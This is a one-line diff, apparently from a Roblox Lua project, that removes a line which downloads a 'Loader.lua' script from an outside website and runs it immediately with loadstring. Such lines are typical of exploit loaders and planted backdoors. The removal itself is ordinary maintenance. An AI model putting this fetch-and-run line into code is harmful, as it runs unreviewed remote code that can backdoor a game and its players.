@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://senseijoshy.com/Loader.lua"))()
